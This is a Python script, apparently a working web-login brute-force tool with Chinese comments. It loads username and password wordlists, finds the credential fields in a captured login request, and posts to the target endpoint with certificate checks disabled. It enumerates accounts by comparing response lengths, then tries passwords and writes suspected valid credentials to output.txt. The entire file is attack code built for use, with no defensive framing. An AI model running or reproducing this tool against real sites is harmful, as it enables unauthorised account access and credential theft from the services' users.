import json
import re

import requests
from urllib.parse import urlparse, parse_qs, urljoin


class send:
    def __init__(self, url, reqeust_data):
        requests.packages.urllib3.disable_warnings()

        self.reqeust_data = reqeust_data
        self.params = reqeust_data['params']
        self.path = reqeust_data['url']
        self.method = reqeust_data['method']
        self.url = url

        with open("users.txt", 'r') as f:
            self.users = f.read().splitlines()
        with open("passwords.txt", 'r') as f:
            self.passwords = f.read().splitlines()
        with open("users_both.txt", 'r') as f:
            self.users_both = f.read().splitlines()

        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
            "Accept": "application/json, text/javascript, */*; q=0.01"
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)

        self.base_response2 = None
        self.base_response1 = None

        self.key_password = None
        self.key_username = None

        self.send_url = None
        self.base_url = None
        self.login_url = None
        self.final_params = None

    def run(self):
        if self.params is None:
            pass
        if self.handle_param() == 0:
            pass

    def handle_param(self):

        # 处理url
        self.login_url = urlparse(self.url)
        self.base_url = f"{self.login_url.scheme}://{self.login_url.netloc}"

        if self.path.startswith(('http://', 'https://')):
            self.send_url = self.path
        else:
            self.send_url = urljoin(self.base_url, self.path)
        print(self.send_url)

        # 将字符串转换为字典格式
        try:
            self.final_params = json.loads(self.params)
            if self.get_param(self.final_params) == 0:
                return 0
            self.handle_response("json")
        except json.JSONDecodeError:
            # 如果 JSON 格式无效，则使用 parse_qs 转换为普通的键值对
            self.final_params = {k: v[0] for k, v in parse_qs(self.params).items()}.copy()
            if self.get_param(self.final_params) == 0:
                return 0
            self.handle_response()

    def handle_response(self, param_type=""):
        self.final_params[self.key_username] = "28173yajhshdkjaSAD"
        self.final_params[self.key_password] = "8043U5JHDGSDFQA"
        params = self.final_params

        self.base_response1 = self.send(params, param_type)

        if "密" in self.base_response1.text:
            self.attack_both(self.final_params, param_type)
        elif "验" in self.base_response1.text:
            pass
        else:
            self.attack_username(self.final_params, param_type)

    def attack_username(self, params, param_type=""):
        print("[INFO] 开始爆破账号")
        for user in self.users:
            params[self.key_username] = user
            params[self.key_password] = "admin123"
            response = self.send(params, param_type)
            print(params)

            if self.check_response(response) == 0:
                break

            if len(response.text) != len(self.base_response1.text) and "密" in response.text:  # 发现不同的响应
                print(f"[INFO] 爆破出账号:{user}")
                self.final_params['username'] = user
                self.final_params['password'] = "8043U5JHDGSDFQA24"

                self.base_response2 = self.send(params, param_type)

                self.attacak_password(params, user, param_type)
                break
            print(
                f"请求用户名: {user}, 密码: admin123, 响应内容: {response.text}, 长度: {len(response.text)}")

    def attacak_password(self, params, user, param_type=""):
        print("[INFO] 开始爆破密码")
        for password in self.passwords:
            params[self.key_username] = user
            params[self.key_password] = password
            response = self.send(params, param_type)
            print(params)

            if self.check_response(response) == 0:
                break
            if len(response.text) != len(self.base_response2.text):
                print("疑似爆破出密码，已保存至output.txt")
                with open("output.txt", 'a', encoding="utf-8") as f:
                    f.write(f"{self.url}\n")
                    f.write(f"username:{user}, password:{password}\n")
            print(
                f"请求用户名: admin, 密码: {password}, 响应内容: {response.text}, 长度: {len(response.text)}")

    def attack_both(self, params, param_type=""):
        print("[INFO] 同时爆破用户密码")
        for user in self.users_both:
            for password in self.passwords:
                params[self.key_username] = user
                params[self.key_password] = password
                print(params)
                response = self.send(params, param_type)

                if self.check_response(response) == 0:
                    break
                if len(response.text) != len(self.base_response1.text):
                    print("疑似爆破出密码，已保存至output.txt")
                    with open("output.txt", 'a', encoding="utf-8") as f:
                        f.write(f"{self.url}\n")
                        f.write(f"username:{user}, password:{password}\n")
                print(
                    f"请求用户名: {user}, 密码: {password}, 响应内容: {response.text}, 长度: {len(response.text)}")

    def get_param(self, data):
        found_password = False
        found_username = False
        pattern_user_name = re.compile(r'(user|name|id|acc|phon)', re.IGNORECASE)
        pattern_pass = re.compile(r'(pass|pwd)', re.IGNORECASE)

        for key, value in data.items():
            if pattern_pass.search(key) and not found_password:
                self.key_password = key
                print(f"匹配到密码字段 {key}")
                found_password = True
            elif pattern_user_name.search(key) and not found_username:

                self.key_username = key
                print(f"匹配到用户名字段 {key}")
                found_username = True

        if found_password == found_username == 0:
            print("没有匹配到关键字")
            return 0

    def send(self, params, param_type=""):
        if param_type == "json":
            response = self.session.post(self.send_url, json=params, verify=False)
        else:
            response = self.session.post(self.send_url, data=params, verify=False)
        return response

    def check_response(self, response):
        if response.status_code != 200:
            print(f"[ERROR] 请求失败，响应码: {response.status_code}，停止爆破。")
            return 0
        if len(response.text) > 1000:
            print(f"[ERROR] 登陆接口调用失败: 响应码：{response.status_code}，{response.text}停止爆破。")
            return 0
